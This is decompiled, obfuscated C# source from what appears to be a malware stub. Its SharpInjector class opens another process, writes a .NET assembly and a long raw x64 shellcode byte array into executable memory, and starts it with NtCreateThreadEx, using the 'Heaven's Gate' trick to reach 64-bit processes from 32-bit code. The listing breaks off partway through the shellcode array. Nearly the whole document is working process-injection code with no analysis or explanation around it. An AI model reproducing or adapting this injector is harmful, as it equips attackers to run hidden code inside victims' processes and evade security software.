using System;
using System.Collections.Generic;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Text;
using dg3ypDAonQcOidMs0w;
using rE4lpnT863QnijKQK5;

namespace Stub
{
	// Token: 0x020000AA RID: 170
	internal sealed class SharpInjector
	{
		// Token: 0x0600025D RID: 605 RVA: 0x00017578 File Offset: 0x00015778
		public static IntPtr GetProcessHandleWithRequiredRights(int pid)
		{
			return NativeMethods.OpenProcess(1082U, false, (uint)pid);
		}

		// Token: 0x0600025E RID: 606 RVA: 0x0001759C File Offset: 0x0001579C
		public static bool IsProcess64Bit(int pid, out bool worked)
		{
			worked = false;
			IntPtr intPtr = NativeMethods.OpenProcess(4096U, false, (uint)pid);
			bool flag;
			if (intPtr == IntPtr.Zero)
			{
				flag = false;
			}
			else
			{
				bool flag2 = Utils.IsProcess64Bit(intPtr);
				NativeMethods.CloseHandle(intPtr);
				worked = true;
				flag = flag2;
			}
			return flag;
		}

		// Token: 0x0600025F RID: 607 RVA: 0x000175E4 File Offset: 0x000157E4
		public static SharpInjector.InjectionStatusCode Inject(int PID, byte[] DllBytes, string NameSpace, string Class, string Method, SharpInjector.DllArchitecture dllArchitecture, uint MaxShellCodeWaitTime = 1000U)
		{
			IntPtr processHandleWithRequiredRights = SharpInjector.GetProcessHandleWithRequiredRights(PID);
			SharpInjector.InjectionStatusCode injectionStatusCode;
			if (processHandleWithRequiredRights == IntPtr.Zero)
			{
				injectionStatusCode = SharpInjector.InjectionStatusCode.COULDNT_OPEN_PROCESS;
			}
			else
			{
				SharpInjector.InjectionStatusCode injectionStatusCode2 = SharpInjector.Inject(processHandleWithRequiredRights, DllBytes, NameSpace, Class, Method, dllArchitecture, MaxShellCodeWaitTime);
				NativeMethods.CloseHandle(processHandleWithRequiredRights);
				injectionStatusCode = injectionStatusCode2;
			}
			return injectionStatusCode;
		}

		// Token: 0x06000260 RID: 608 RVA: 0x00017624 File Offset: 0x00015824
		public static SharpInjector.InjectionStatusCode Inject(IntPtr ProcessHandle, byte[] DllBytes, string NameSpace, string Class, string Method, SharpInjector.DllArchitecture dllArchitecture, uint MaxShellCodeWaitTime = 1000U)
		{
			bool flag;
			if (flag = Utils.IsProcess64Bit(ProcessHandle))
			{
				if (dllArchitecture == SharpInjector.DllArchitecture.X86)
				{
					return SharpInjector.InjectionStatusCode.WRONG_DLL_ARCH_FOR_PROCESS_ARCH;
				}
			}
			else if (dllArchitecture == SharpInjector.DllArchitecture.X64)
			{
				return SharpInjector.InjectionStatusCode.WRONG_DLL_ARCH_FOR_PROCESS_ARCH;
			}
			SharpInjector.InjectionStatusCode injectionStatusCode;
			if (flag)
			{
				injectionStatusCode = SharpInjector.Inject64(ProcessHandle, DllBytes, NameSpace, Class, Method, MaxShellCodeWaitTime);
			}
			else
			{
				injectionStatusCode = SharpInjector.Inject32(ProcessHandle, DllBytes, NameSpace, Class, Method, MaxShellCodeWaitTime);
			}
			return injectionStatusCode;
		}

		// Token: 0x06000261 RID: 609 RVA: 0x00017674 File Offset: 0x00015874
		public static SharpInjector.InjectionStatusCode Inject(IntPtr ProcessHandle, Action function, uint MaxShellCodeWaitTime = 1000U, byte[] ExtraDataAtInjectEnd = null)
		{
			if (!function.Method.IsStatic)
			{
				throw new Exception("the supplied method needs to be static!");
			}
			if (SharpInjector.SelfByteCache == null)
			{
				SharpInjector.SelfByteCache = Utils.GetCurrentSelfBytes();
			}
			byte[] array = SharpInjector.SelfByteCache;
			if (ExtraDataAtInjectEnd != null)
			{
				array = new byte[SharpInjector.SelfByteCache.Length + ExtraDataAtInjectEnd.Length];
				Buffer.BlockCopy(SharpInjector.SelfByteCache, 0, array, 0, SharpInjector.SelfByteCache.Length);
				Buffer.BlockCopy(ExtraDataAtInjectEnd, 0, array, SharpInjector.SelfByteCache.Length, ExtraDataAtInjectEnd.Length);
			}
			return SharpInjector.Inject(ProcessHandle, array, function.Method.DeclaringType.Namespace, function.Method.DeclaringType.Name, function.Method.Name, SharpInjector.GetCurrentArch(), MaxShellCodeWaitTime);
		}

		// Token: 0x06000262 RID: 610 RVA: 0x00017730 File Offset: 0x00015930
		public static SharpInjector.InjectionStatusCode Inject(int PID, Action function, uint MaxShellCodeWaitTimeMilli = 1000U, byte[] ExtraDataAtInjectEnd = null)
		{
			IntPtr processHandleWithRequiredRights = SharpInjector.GetProcessHandleWithRequiredRights(PID);
			SharpInjector.InjectionStatusCode injectionStatusCode;
			if (processHandleWithRequiredRights == IntPtr.Zero)
			{
				injectionStatusCode = SharpInjector.InjectionStatusCode.COULDNT_OPEN_PROCESS;
			}
			else
			{
				SharpInjector.InjectionStatusCode injectionStatusCode2 = SharpInjector.Inject(processHandleWithRequiredRights, function, MaxShellCodeWaitTimeMilli, ExtraDataAtInjectEnd);
				NativeMethods.CloseHandle(processHandleWithRequiredRights);
				injectionStatusCode = injectionStatusCode2;
			}
			return injectionStatusCode;
		}

		// Token: 0x06000263 RID: 611 RVA: 0x0001776C File Offset: 0x0001596C
		private static SharpInjector.DllArchitecture GetCurrentArch()
		{
			PortableExecutableKinds portableExecutableKinds;
			ImageFileMachine imageFileMachine;
			Assembly.GetExecutingAssembly().ManifestModule.GetPEKind(out portableExecutableKinds, out imageFileMachine);
			if ((portableExecutableKinds & PortableExecutableKinds.PE32Plus) == PortableExecutableKinds.PE32Plus)
			{
				if (imageFileMachine == ImageFileMachine.AMD64 || imageFileMachine == ImageFileMachine.IA64)
				{
					return SharpInjector.DllArchitecture.X64;
				}
			}
			else if (imageFileMachine == ImageFileMachine.I386)
			{
				if ((portableExecutableKinds & PortableExecutableKinds.Required32Bit) == PortableExecutableKinds.Required32Bit)
				{
					return SharpInjector.DllArchitecture.X86;
				}
				return SharpInjector.DllArchitecture.AnyCpu;
			}
			return SharpInjector.DllArchitecture.AnyCpu;
		}

		// Token: 0x06000264 RID: 612 RVA: 0x000177D0 File Offset: 0x000159D0
		private static SharpInjector.InjectionStatusCode Inject32(IntPtr ProcessHandle, byte[] injectingFile, string NameSpace, string Class, string FunctionName, uint MaxWaitTime = 1000U)
		{
			uint num = 4096U;
			uint num2 = 8192U;
			uint num3 = 64U;
			uint num4 = 2097151U;
			string text = NameSpace + "." + Class;
			IntPtr intPtr = NativeMethods.VirtualAllocEx(ProcessHandle, IntPtr.Zero, (UIntPtr)((ulong)((long)injectingFile.Length)), 12288U, 4U);
			SharpInjector.InjectionStatusCode injectionStatusCode;
			if (intPtr == IntPtr.Zero)
			{
				injectionStatusCode = SharpInjector.InjectionStatusCode.COULDNT_WRITE_TO_PROCESS;
			}
			else if (!Utils32.WriteBytesToProcess32(ProcessHandle, intPtr, injectingFile))
			{
				injectionStatusCode = SharpInjector.InjectionStatusCode.COULDNT_WRITE_TO_PROCESS;
			}
			else
			{
				uint remoteProcAddress32Bit;
				uint remoteProcAddress32Bit2;
				uint remoteProcAddress32Bit3;
				uint remoteProcAddress32Bit4;
				uint remoteProcAddress32Bit5;
				try
				{
					uint remoteModuleHandle32Bit = Utils32.GetRemoteModuleHandle32Bit(ProcessHandle, "kernel32.dll", 600);
					remoteProcAddress32Bit = Utils32.GetRemoteProcAddress32Bit(ProcessHandle, remoteModuleHandle32Bit, "HeapAlloc");
					remoteProcAddress32Bit2 = Utils32.GetRemoteProcAddress32Bit(ProcessHandle, remoteModuleHandle32Bit, "HeapFree");
					remoteProcAddress32Bit3 = Utils32.GetRemoteProcAddress32Bit(ProcessHandle, remoteModuleHandle32Bit, "GetProcessHeap");
					remoteProcAddress32Bit4 = Utils32.GetRemoteProcAddress32Bit(ProcessHandle, remoteModuleHandle32Bit, "LoadLibraryA");
					remoteProcAddress32Bit5 = Utils32.GetRemoteProcAddress32Bit(ProcessHandle, remoteModuleHandle32Bit, "GetProcAddress");
				}
				catch
				{
					return SharpInjector.InjectionStatusCode.COULDNT_GET_REMOTE_PROCEDURE_HANDLE;
				}
				if (remoteProcAddress32Bit == 0U || remoteProcAddress32Bit2 == 0U || remoteProcAddress32Bit3 == 0U || remoteProcAddress32Bit4 == 0U || remoteProcAddress32Bit5 == 0U)
				{
					injectionStatusCode = SharpInjector.InjectionStatusCode.COULDNT_GET_REMOTE_PROCEDURE_HANDLE;
				}
				else
				{
					uint num5 = (uint)(int)intPtr;
					uint num6 = (uint)injectingFile.Length;
					List<byte> list = new List<byte>();
					list.AddRange(BitConverter.GetBytes(remoteProcAddress32Bit));
					list.AddRange(BitConverter.GetBytes(remoteProcAddress32Bit2));
					list.AddRange(BitConverter.GetBytes(remoteProcAddress32Bit3));
					list.AddRange(BitConverter.GetBytes(remoteProcAddress32Bit4));
					list.AddRange(BitConverter.GetBytes(remoteProcAddress32Bit5));
					list.AddRange(BitConverter.GetBytes(num5));
					list.AddRange(BitConverter.GetBytes(num6));
					list.AddRange(BitConverter.GetBytes((uint)((text.Length + 1) * 2)));
					list.AddRange(Encoding.Unicode.GetBytes(text));
					list.AddRange(new byte[2]);
					list.AddRange(BitConverter.GetBytes((uint)((FunctionName.Length + 1) * 2)));
					list.AddRange(Encoding.Unicode.GetBytes(FunctionName));
					list.AddRange(new byte[2]);
					int count = list.Count;
					list.AddRange(SharpInjector.InjectAssembly32Bit);
					byte[] array = list.ToArray();
					intPtr = NativeMethods.VirtualAllocEx(ProcessHandle, IntPtr.Zero, (UIntPtr)((ulong)((long)array.Length)), num | num2, num3);
					if (intPtr == IntPtr.Zero)
					{
						injectionStatusCode = SharpInjector.InjectionStatusCode.COULDNT_WRITE_TO_PROCESS;
					}
					else if (!Utils32.WriteBytesToProcess32(ProcessHandle, intPtr, array))
					{
						injectionStatusCode = SharpInjector.InjectionStatusCode.COULDNT_WRITE_TO_PROCESS;
					}
					else
					{
						IntPtr zero = IntPtr.Zero;
						if (NativeMethods.NtCreateThreadEx(ref zero, num4, IntPtr.Zero, ProcessHandle, intPtr + count, intPtr, false, 0, 0, 0, IntPtr.Zero) > 0U)
						{
							injectionStatusCode = SharpInjector.InjectionStatusCode.COULDNT_CREATE_REMOTE_THREAD;
						}
						else
						{
							IntPtr intPtr2 = Marshal.AllocHGlobal(8);
							Marshal.WriteInt64(intPtr2, (long)(-(ulong)(MaxWaitTime * 1000000U) / 100UL));
							if (NativeMethods.NtWaitForSingleObject(zero, false, intPtr2) > 0U)
							{
								Marshal.FreeHGlobal(intPtr2);
								injectionStatusCode = SharpInjector.InjectionStatusCode.EXCEEDED_TIMEOUT;
							}
							else
							{
								Marshal.FreeHGlobal(intPtr2);
								uint num7 = (uint)Marshal.SizeOf(typeof(InternalStructs.THREAD_BASIC_INFORMATION));
								IntPtr intPtr3 = Marshal.AllocHGlobal((int)num7);
								uint num8;
								if (NativeMethods.NtQueryInformationThread(zero, InternalStructs.THREADINFOCLASS.ThreadBasicInformation, intPtr3, num7, out num8) > 0U)
								{
									Marshal.FreeHGlobal(intPtr3);
									injectionStatusCode = SharpInjector.InjectionStatusCode.COULDNT_GET_EXITCODE;
								}
								else
								{
									InternalStructs.THREAD_BASIC_INFORMATION thread_BASIC_INFORMATION = Marshal.PtrToStructure<InternalStructs.THREAD_BASIC_INFORMATION>(intPtr3);
									Marshal.FreeHGlobal(intPtr3);
									if (thread_BASIC_INFORMATION.ExitStatus == 4294967295U)
									{
										injectionStatusCode = SharpInjector.InjectionStatusCode.SHELLCODE_RETURNED_BAD_RESULT;
									}
									else
									{
										injectionStatusCode = SharpInjector.InjectionStatusCode.SUCCESS;
									}
								}
							}
						}
					}
				}
			}
			return injectionStatusCode;
		}

		// Token: 0x06000265 RID: 613 RVA: 0x00017B0C File Offset: 0x00015D0C
		private static SharpInjector.InjectionStatusCode Inject64(IntPtr ProcessHandle, byte[] injectingFile, string NameSpace, string Class, string FunctionName, uint MaxWaitTime = 1000U)
		{
			uint num = 4096U;
			uint num2 = 8192U;
			uint num3 = 64U;
			uint num4 = 2097151U;
			string text = NameSpace + "." + Class;
			IntPtr intPtr = NativeMethods.VirtualAllocEx(ProcessHandle, IntPtr.Zero, (UIntPtr)((ulong)((long)injectingFile.Length)), 12288U, 4U);
			SharpInjector.InjectionStatusCode injectionStatusCode;
			if (intPtr == IntPtr.Zero)
			{
				injectionStatusCode = SharpInjector.InjectionStatusCode.COULDNT_WRITE_TO_PROCESS;
			}
			else if (!Utils64.WriteBytesToProcess64(ProcessHandle, (ulong)(long)intPtr, injectingFile))
			{
				injectionStatusCode = SharpInjector.InjectionStatusCode.COULDNT_WRITE_TO_PROCESS;
			}
			else
			{
				ulong remoteProcAddress64Bit;
				ulong remoteProcAddress64Bit2;
				ulong remoteProcAddress64Bit3;
				ulong remoteProcAddress64Bit4;
				ulong remoteProcAddress64Bit5;
				try
				{
					ulong remoteModuleHandle64Bit = Utils64.GetRemoteModuleHandle64Bit(ProcessHandle, "kernel32.dll", 600);
					remoteProcAddress64Bit = Utils64.GetRemoteProcAddress64Bit(ProcessHandle, remoteModuleHandle64Bit, "HeapAlloc");
					remoteProcAddress64Bit2 = Utils64.GetRemoteProcAddress64Bit(ProcessHandle, remoteModuleHandle64Bit, "HeapFree");
					remoteProcAddress64Bit3 = Utils64.GetRemoteProcAddress64Bit(ProcessHandle, remoteModuleHandle64Bit, "GetProcessHeap");
					remoteProcAddress64Bit4 = Utils64.GetRemoteProcAddress64Bit(ProcessHandle, remoteModuleHandle64Bit, "LoadLibraryA");
					remoteProcAddress64Bit5 = Utils64.GetRemoteProcAddress64Bit(ProcessHandle, remoteModuleHandle64Bit, "GetProcAddress");
				}
				catch
				{
					return SharpInjector.InjectionStatusCode.COULDNT_GET_REMOTE_PROCEDURE_HANDLE;
				}
				if (remoteProcAddress64Bit == 0UL || remoteProcAddress64Bit2 == 0UL || remoteProcAddress64Bit3 == 0UL || remoteProcAddress64Bit4 == 0UL || remoteProcAddress64Bit5 == 0UL)
				{
					injectionStatusCode = SharpInjector.InjectionStatusCode.COULDNT_GET_REMOTE_PROCEDURE_HANDLE;
				}
				else
				{
					ulong num5 = (ulong)(long)intPtr;
					ulong num6 = (ulong)((long)injectingFile.Length);
					List<byte> list = new List<byte>();
					list.AddRange(BitConverter.GetBytes(remoteProcAddress64Bit));
					list.AddRange(BitConverter.GetBytes(remoteProcAddress64Bit2));
					list.AddRange(BitConverter.GetBytes(remoteProcAddress64Bit3));
					list.AddRange(BitConverter.GetBytes(remoteProcAddress64Bit4));
					list.AddRange(BitConverter.GetBytes(remoteProcAddress64Bit5));
					list.AddRange(BitConverter.GetBytes(num5));
					list.AddRange(BitConverter.GetBytes(num6));
					list.AddRange(BitConverter.GetBytes((ulong)(((long)text.Length + 1L) * 2L)));
					list.AddRange(Encoding.Unicode.GetBytes(text));
					list.AddRange(new byte[2]);
					list.AddRange(BitConverter.GetBytes((ulong)(((long)FunctionName.Length + 1L) * 2L)));
					list.AddRange(Encoding.Unicode.GetBytes(FunctionName));
					list.AddRange(new byte[2]);
					int count = list.Count;
					list.AddRange(SharpInjector.InjectAssembly64Bit);
					byte[] array = list.ToArray();
					intPtr = NativeMethods.VirtualAllocEx(ProcessHandle, IntPtr.Zero, (UIntPtr)((ulong)((long)array.Length)), num | num2, num3);
					if (intPtr == IntPtr.Zero)
					{
						injectionStatusCode = SharpInjector.InjectionStatusCode.COULDNT_WRITE_TO_PROCESS;
					}
					else if (!Utils64.WriteBytesToProcess64(ProcessHandle, (ulong)(long)intPtr, array))
					{
						injectionStatusCode = SharpInjector.InjectionStatusCode.COULDNT_WRITE_TO_PROCESS;
					}
					else
					{
						uint num9;
						if (Environment.Is64BitProcess)
						{
							IntPtr zero = IntPtr.Zero;
							if (NativeMethods.NtCreateThreadEx(ref zero, num4, IntPtr.Zero, ProcessHandle, intPtr + count, intPtr, false, 0, 0, 0, IntPtr.Zero) > 0U)
							{
								return SharpInjector.InjectionStatusCode.COULDNT_CREATE_REMOTE_THREAD;
							}
							IntPtr intPtr2 = Marshal.AllocHGlobal(8);
							Marshal.WriteInt64(intPtr2, (long)(-(ulong)(MaxWaitTime * 1000000U) / 100UL));
							if (NativeMethods.NtWaitForSingleObject(zero, false, intPtr2) > 0U)
							{
								Marshal.FreeHGlobal(intPtr2);
								return SharpInjector.InjectionStatusCode.EXCEEDED_TIMEOUT;
							}
							Marshal.FreeHGlobal(intPtr2);
							uint num7 = (uint)Marshal.SizeOf(typeof(InternalStructs.THREAD_BASIC_INFORMATION));
							IntPtr intPtr3 = Marshal.AllocHGlobal((int)num7);
							uint num8;
							if (NativeMethods.NtQueryInformationThread(zero, InternalStructs.THREADINFOCLASS.ThreadBasicInformation, intPtr3, num7, out num8) > 0U)
							{
								Marshal.FreeHGlobal(intPtr3);
								return SharpInjector.InjectionStatusCode.COULDNT_GET_EXITCODE;
							}
							InternalStructs.THREAD_BASIC_INFORMATION thread_BASIC_INFORMATION = Marshal.PtrToStructure<InternalStructs.THREAD_BASIC_INFORMATION>(intPtr3);
							Marshal.FreeHGlobal(intPtr3);
							num9 = thread_BASIC_INFORMATION.ExitStatus;
						}
						else
						{
							if (!HeavensGate.operational)
							{
								return SharpInjector.InjectionStatusCode.HEAVENSGATE_NON_OPERATIONAL;
							}
							ulong moduleHandle = HeavensGate.GetModuleHandle64("ntdll.dll");
							if (moduleHandle == 0UL)
							{
								return SharpInjector.InjectionStatusCode.COULDNT_GET_NTDLL_FROM_HEAVENSGATE;
							}
							ulong procAddress = HeavensGate.GetProcAddress64(moduleHandle, "NtCreateThreadEx");
							ulong procAddress2 = HeavensGate.GetProcAddress64(moduleHandle, "NtWaitForSingleObject");
							ulong procAddress3 = HeavensGate.GetProcAddress64(moduleHandle, "NtQueryInformationThread");
							IntPtr intPtr4 = Marshal.AllocHGlobal(8);
							ulong num10 = procAddress;
							ulong[] array2 = new ulong[11];
							array2[0] = (ulong)(long)intPtr4;
							array2[1] = (ulong)num4;
							array2[3] = (ulong)(long)ProcessHandle;
							array2[4] = (ulong)(long)(intPtr + count);
							array2[5] = (ulong)(long)intPtr;
							if (HeavensGate.Execute64(num10, array2) > 0UL)
							{
								Marshal.FreeHGlobal(intPtr4);
								return SharpInjector.InjectionStatusCode.COULDNT_CREATE_REMOTE_THREAD;
							}
							ulong value = Marshal.PtrToStructure<InternalStructs.ULONGRESULT>(intPtr4).Value;
							Marshal.FreeHGlobal(intPtr4);
							IntPtr intPtr5 = Marshal.AllocHGlobal(8);
							Marshal.WriteInt64(intPtr5, (long)(-(ulong)(MaxWaitTime * 1000000U) / 100UL));
							if (HeavensGate.Execute64(procAddress2, new ulong[]
							{
								value,
								0UL,
								(ulong)(long)intPtr5
							}) > 0UL)
							{
								Marshal.FreeHGlobal(intPtr5);
								return SharpInjector.InjectionStatusCode.EXCEEDED_TIMEOUT;
							}
							Marshal.FreeHGlobal(intPtr5);
							uint num11 = (uint)Marshal.SizeOf(typeof(InternalStructs64.THREAD_BASIC_INFORMATION64));
							IntPtr intPtr6 = Marshal.AllocHGlobal((int)num11);
							ulong num12 = procAddress3;
							ulong[] array3 = new ulong[5];
							array3[0] = value;
							array3[2] = (ulong)(long)intPtr6;
							array3[3] = (ulong)num11;
							if (HeavensGate.Execute64(num12, array3) > 0UL)
							{
								Marshal.FreeHGlobal(intPtr6);
								return SharpInjector.InjectionStatusCode.COULDNT_GET_EXITCODE;
							}
							InternalStructs64.THREAD_BASIC_INFORMATION64 thread_BASIC_INFORMATION2 = Marshal.PtrToStructure<InternalStructs64.THREAD_BASIC_INFORMATION64>(intPtr6);
							Marshal.FreeHGlobal(intPtr6);
							num9 = thread_BASIC_INFORMATION2.ExitStatus;
						}
						if (num9 == 4294967295U)
						{
							injectionStatusCode = SharpInjector.InjectionStatusCode.SHELLCODE_RETURNED_BAD_RESULT;
						}
						else
						{
							injectionStatusCode = SharpInjector.InjectionStatusCode.SUCCESS;
						}
					}
				}
			}
			return injectionStatusCode;
		}

		// Token: 0x06000266 RID: 614 RVA: 0x000038B4 File Offset: 0x00001AB4
		public SharpInjector()
		{
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			base..ctor();
		}

		// Token: 0x06000267 RID: 615 RVA: 0x00003F10 File Offset: 0x00002110
		static SharpInjector()
		{
			WP6RZJql8gZrNhVA9v.prXoP4RuYp();
			hHEYokUTtehNq5ji0d.QgAwAnEzW2N9V();
			SharpInjector.InjectAssembly64Bit = new byte[]
			{
				85, 72, 137, 229, 72, 131, 236, 64, 73, 137,
				204, 65, byte.MaxValue, 84, 36, 16, 72, 137, 193, 186,
				8, 0, 0, 0, 65, 184, 0, 4, 0, 0,
				65, byte.MaxValue, 20, 36, 72, 137, 195, 73, 139, 4,
				36, 72, 137, 131, 144, 1, 0, 0, 73, 139,
				68, 36, 8, 72, 137, 131, 152, 1, 0, 0,
				73, 139, 68, 36, 16, 72, 137, 131, 160, 1,
				0, 0, 73, 139, 68, 36, 24, 72, 137, 131,
				168, 1, 0, 0, 73, 139, 68, 36, 32, 72,
				137, 131, 176, 1, 0, 0, 73, 139, 68, 36,
				40, 72, 137, 131, 208, 0, 0, 0, 73, 139,
				68, 36, 48, 72, 137, 131, 216, 0, 0, 0,
				76, 137, 224, 72, 131, 192, 64, 72, 137, 131,
				88, 2, 0, 0, 76, 137, 224, 72, 131, 192,
				64, 73, 3, 68, 36, 56, 72, 131, 192, 8,
				72, 137, 131, 96, 2, 0, 0, 232, 139, 6,
				0, 0, 72, 131, 248, 0, 15, 132, 236, 3,
				0, 0, 72, 137, 91, 8, 232, 65, 4, 0,
				0, 72, 137, 67, 16, 232, 129, 4, 0, 0,
				72, 137, 67, 24, 72, 139, 75, 16, 72, 139,
				83, 24, 76, 139, 67, 8, byte.MaxValue, 147, 248, 1,
				0, 0, 72, 131, 248, 0, 15, 133, 186, 3,
				0, 0, 72, 139, 3, 72, 139, 0, 72, 139,
				64, 40, 72, 137, 67, 32, 72, 137, 216, 72,
				131, 192, 40, 72, 137, 67, 48, 72, 139, 11,
				72, 139, 83, 48, byte.MaxValue, 83, 32, 72, 131, 248,
				0, 15, 133, 141, 3, 0, 0, 232, 120, 4,
				0, 0, 72, 137, 67, 56, 72, 137, 216, 72,
				131, 192, 64, 72, 137, 67, 72, 72, 137, 216,
				72, 131, 192, 80, 72, 137, 67, 88, 72, 139,
				67, 40, 72, 139, 0, 72, 139, 64, 24, 72,
				137, 67, 96, 72, 139, 75, 40, 72, 199, 194,
				1, 0, 0, 0, 76, 139, 67, 88, 73, 199,
				193, 0, 0, 0, 0, byte.MaxValue, 83, 96, 72, 131,
				248, 0, 117, 26, 72, 139, 67, 80, 72, 139,
				0, 72, 139, 0, 72, 139, 75, 80, 72, 139,
				83, 56, 76, 139, 67, 72, byte.MaxValue, 208, 235, 199,
				72, 131, 123, 64, 0, 15, 132, 27, 3, 0,
				0, 72, 139, 67, 64, 72, 139, 0, 72, 139,
				64, 72, 72, 137, 67, 104, 232, 64, 4, 0,
				0, 72, 137, 67, 112, 232, 128, 4, 0, 0,
				72, 137, 67, 120, 72, 137, 216, 72, 5, 128,
				0, 0, 0, 72, 137, 131, 136, 0, 0, 0,
				72, 139, 75, 64, 72, 139, 83, 120, 76, 139,
				67, 112, 76, 139, 139, 136, 0, 0, 0, byte.MaxValue,
				83, 104, 72, 131, 248, 0, 15, 133, 202, 2,
				0, 0, 72, 131, 187, 128, 0, 0, 0, 0,
				15, 132, 188, 2, 0, 0, 72, 139, 131, 128,
				0, 0, 0, 72, 139, 0, 72, 139, 64, 80,
				72, 137, 131, 144, 0, 0, 0, 72, 139, 139,
				128, 0, 0, 0, byte.MaxValue, 147, 144, 0, 0, 0,
				72, 131, 248, 0, 15, 133, 144, 2, 0, 0,
				72, 139, 131, 128, 0, 0, 0, 72, 139, 0,
				72, 139, 64, 104, 72, 137, 131, 152, 0, 0,
				0, 72, 137, 216, 72, 5, 160, 0, 0, 0,
				72, 137, 131, 168, 0, 0, 0, 232, 49, 4,
				0, 0, 72, 137, 131, 176, 0, 0, 0, 72,
				139, 139, 128, 0, 0, 0, 72, 139, 147, 168,
				0, 0, 0, byte.MaxValue, 147, 152, 0, 0, 0, 72,
				131, 187, 160, 0, 0, 0, 0, 15, 132, 61,
				2, 0, 0, 72, 137, 216, 72, 5, 184, 0,
				0, 0, 72, 137, 131, 192, 0, 0, 0, 72,
				139, 131, 160, 0, 0, 0, 72, 139, 0, 72,
				139, 0, 72, 137, 131, 200, 0, 0, 0, 72,
				139, 139, 160, 0, 0, 0, 72, 139, 147, 176,
				0, 0, 0, 76, 139, 131, 192, 0, 0, 0,
				byte.MaxValue, 147, 200, 0, 0, 0, 72, 131, 187, 184,
				0, 0, 0, 0, 15, 132, 240, 1, 0, 0,
				185, 8, 0, 0, 0, 232, 242, 1, 0, 0,
				72, 137, 131, 224, 0, 0, 0, 72, 139, 147,
				216, 0, 0, 0, 137, 16, 199, 64, 4, 0,
				0, 0, 0, 185, 17, 0, 0, 0, 186, 1,
				0, 0, 0, 76, 139, 131, 224, 0, 0, 0,
				byte.MaxValue, 147, 200, 1, 0, 0, 72, 137, 131, 232,
				0, 0, 0, 72, 139, 139, 232, 0, 0, 0,
				byte.MaxValue, 147, 208, 1, 0, 0, 72, 139, 131, 232,
				0, 0, 0, 72, 139, 72, 16, 72, 139, 147,
				208, 0, 0, 0, 76, 139, 131, 216, 0, 0,
				0, 232, 154, 3, 0, 0, 72, 139, 139, 232,
				0, 0, 0, byte.MaxValue, 147, 216, 1, 0, 0, 72,
				137, 216, 72, 5, 240, 0, 0, 0, 72, 137,
				131, 248, 0, 0, 0, 72, 139, 131, 184, 0,
				0, 0, 72, 139, 0, 72, 139, 128, 104, 1,
				0, 0, 72, 137, 131, 0, 1, 0, 0, 72,
				139, 139, 184, 0, 0, 0, 72, 139, 147, 232,
				0, 0, 0, 76, 139, 131, 248, 0, 0, 0,
				byte.MaxValue, 147, 0, 1, 0, 0, 72, 131, 248, 0,
				72, 131, 187, 240, 0, 0, 0, 0, 15, 132,
				36, 1, 0, 0, 72, 137, 216, 72, 5, 8,
				1, 0, 0, 72, 137, 131, 16, 1, 0, 0,
				232, 101, 3, 0, 0, 72, 137, 131, 24, 1,
				0, 0, 72, 139, 131, 240, 0, 0, 0, 72,
				139, 0, 72, 139, 128, 136, 0, 0, 0, 72,
				137, 131, 32, 1, 0, 0, 72, 139, 139, 240,
				0, 0, 0, 72, 139, 147, 24, 1, 0, 0,
				76, 139, 131, 16, 1, 0, 0, byte.MaxValue, 147, 32,
				1, 0, 0, 72, 131, 248, 0, 15, 133, 203,
				0, 0, 0, 72, 131, 187, 8, 1, 0, 0,
				0, 15, 132, 189, 0, 0, 0, 185, 12, 0,
				0, 0, 186, 0, 0, 0, 0, 65, 184, 0,
				0, 0, 0, byte.MaxValue, 147, 232, 1, 0, 0, 72,
				137, 131, 40, 1, 0, 0, 232, 14, 3, 0,
				0, 72, 137, 131, 48, 1, 0, 0, 232, 2,
				3, 0, 0, 72, 137, 131, 56, 1, 0, 0,
				72, 139, 131, 8, 1, 0, 0, 72, 139, 0,
				72, 139, 128, 200, 1, 0, 0, 72, 137, 131,
				64, 1, 0, 0, 232, 164, 2, 0, 0, 72,
				137, 131, 72, 1, 0, 0, 72, 139, 139, 8,
				1, 0, 0, 72, 139, 147, 72, 1, 0, 0,
				65, 184, 24, 1, 0, 0, 65, 185, 0, 0,
				0, 0, 72, 139, 131, 48, 1, 0, 0, 72,
				137, 68, 36, 32, 72, 139, 131, 40, 1, 0,
				0, 72, 137, 68, 36, 40, 72, 139, 179, 56,
				1, 0, 0, 72, 139, 6, 72, 137, 68, 36,
				48, 72, 139, 70, 8, 72, 137, 68, 36, 56,
				72, 139, 70, 16, 72, 137, 68, 36, 62, byte.MaxValue,
				147, 64, 1, 0, 0, 72, 131, 248, 0, 117,
				5, 72, 137, 236, 93, 195, 72, 199, 192, byte.MaxValue,
				byte.MaxValue, byte.MaxValue, byte.MaxValue, 72, 137, 236, 93, 195, 85, 72,
				137, 229, 72, 131, 236, 32, 72, 137, 77, 248,
				byte.MaxValue, 147, 160, 1, 0, 0, 72, 137, 193, 186,
				8, 0, 0, 0, 76, 139, 69, 248, byte.MaxValue, 147,
				144, 1, 0, 0, 72, 137, 236, 93, 195, 85,
				72, 137, 229, 72, 131, 236, 32, 72, 137, 77,
				248, byte.MaxValue, 147, 160, 1, 0, 0, 72, 137, 193,
				186, 0, 0, 0, 0, 76, 139, 69, 248, byte.MaxValue,
				147, 152, 1, 0, 0, 72, 137, 236, 93, 195,
				85, 72, 137, 229, 72, 131, 236, 32, 185, 16,
				0, 0, 0, 232, 156, byte.MaxValue, byte.MaxValue, byte.MaxValue, 199, 0,
				141, 24, 128, 146, 102, 199, 64, 4, 142, 14,
				102, 199, 64, 6, 103, 72, 198, 64, 8, 179,
				198, 64, 9, 12, 198, 64, 10, 127, 198, 64,
				11, 168, 198, 64, 12, 56, 198, 64, 13, 132,
				198, 64, 14, 232, 198, 64, 15, 222, 72, 137,
				236, 93, 195, 85, 72, 137, 229, 72, 131, 236,
				32, 185, 16, 0, 0, 0, 232, 83, byte.MaxValue, byte.MaxValue,
				byte.MaxValue, 199, 0, 158, 219, 50, 211, 102, 199, 64,
				4, 179, 185, 102, 199, 64, 6, 37, 65, 198,
				64, 8, 130, 198, 64, 9, 7, 198, 64, 10,
				161, 198, 64, 11, 72, 198, 64, 12, 132, 198,
				64, 13, 245, 198, 64, 14, 50, 198, 64, 15,
				22, 72, 137, 236, 93, 195, 85, 72, 137, 229,
				72, 131, 236, 32, 185, 16, 0, 0, 0, 232,
				10, byte.MaxValue, byte.MaxValue, byte.MaxValue, 199, 0, 210, 209, 57, 189,
				102, 199, 64, 4, 47, 186, 102, 199, 64, 6,
				106, 72, 198, 64, 8, 137, 198, 64, 9, 176,
				198, 64, 10, 180, 198, 64, 11, 176, 198, 64,
